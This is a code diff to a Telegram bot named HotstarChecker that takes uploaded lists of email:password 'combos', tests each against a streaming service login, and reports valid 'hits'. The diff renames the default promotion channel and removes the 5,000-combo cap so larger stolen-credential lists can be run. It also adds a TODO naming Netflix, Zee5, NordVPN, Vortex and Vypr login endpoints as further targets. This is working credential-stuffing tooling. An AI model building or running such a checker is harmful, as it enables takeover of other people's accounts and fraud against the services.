@@ -17,8 +17,8 @@ try:
     api_id = int(os.environ.get("APP_ID"))
     api_hash = os.environ.get("APP_HASH")
     token = os.environ.get("BOT_TOKEN")
-    channel = os.environ.get("SUB_CHANNEL", "INDIANBINNER")    
-    c_url = os.environ.get("CHANNEL_URL", "https://t.me/INDIANBINNER")        
+    channel = os.environ.get("SUB_CHANNEL", "JokesHubOfficial")    
+    c_url = os.environ.get("CHANNEL_URL", "https://t.me/JokesHubOfficial")        
 except:
     print("Environment variables missing, i am quitting kthnxbye")
     exit(1)
@@ -159,17 +159,19 @@ async def checker(bot: HotstarChecker, message: Message):
     #    await message.reply("Bruhhhhh.... This file is toooooooo big!!!!!!!!!!!!!")
     #    return   
     
-    owo = await message.reply("__Checking... this might take upto a few minutes...__")
+    owo = await message.reply("__Checking... this might take upto a few minutes... You will get the summary at the end of this check!__")
     try:
         combos = await bot.download_media(message, "./")
     except Exception as e:
         return await owo.edit(str(e))
     with open(combos) as f:    
         accs = f.read().splitlines()
+        too_big = False
         if len(accs) > 5000:
-            if os.path.exists(combos):
-                os.remove(combos)                            
-            return await owo.edit("__Send a file with less than 5k combos, this one is quite big...__")
+            too_big = True
+        #    if os.path.exists(combos):
+        #        os.remove(combos)                            
+        #    return await owo.edit("__Send a file with less than 5k combos, this one is quite big...__")
         hits = 0
         bad = 0
         hit_accs = "Hits Accounts:\n"
@@ -208,10 +210,11 @@ async def checker(bot: HotstarChecker, message: Message):
                     bad_accs += f"\n- <code>{one_acc}</code>: Invalid Format ❌"
                     bad += 1
                     b_accs += 1
-                try:    
-                    await owo.edit(f"__Checking...__\n\n**Checked:** `{t_accs}`\n**Hits:** `{h_accs}`\n**Bads:** `{b_accs}`")    
-                except FloodWait as e:
-                    await asyncio.sleep(e.x)
+                if not too_big:    
+                    try:    
+                        await owo.edit(f"__Checking...__\n\n**Checked:** `{t_accs}`\n**Hits:** `{h_accs}`\n**Bads:** `{b_accs}`")    
+                    except FloodWait as e:
+                        await asyncio.sleep(e.x)                     
                 
             cleanr = re.compile("<.*?>")
             cleantext = re.sub(cleanr, "", hit_accs+"\n\n"+bad_accs)
@@ -231,7 +234,16 @@ async def checker(bot: HotstarChecker, message: Message):
         except:
             await owo.edit("❌ --**Something Went Wrong!**-- ❌\n\n__Make sure you have put account in correct order in the file, i.e, email:pass... retry again!__")
             raise
-        
+
+            
+# TODO: 
+# Netflix: https://www.netflix.com/fr/login
+# Zee5: https://userapi.zee5.com/v1/user/loginemail?email=email&password=password
+# Nord: https://ucp.nordvpn.com/login/
+# Vortex: https://vortex-api.gg/login
+# Vypr: https://www.goldenfrog.com/api/public/auth/singleusetoken
+
+
 # dont let others add bot to chat coz that will make the bot spam it and get rate limited.... uhmm and ntg else, you can edit accordingly        
 @HotstarChecker.on_message(filters.new_chat_members)
 async def welcome(bot: HotstarChecker, message: Message):
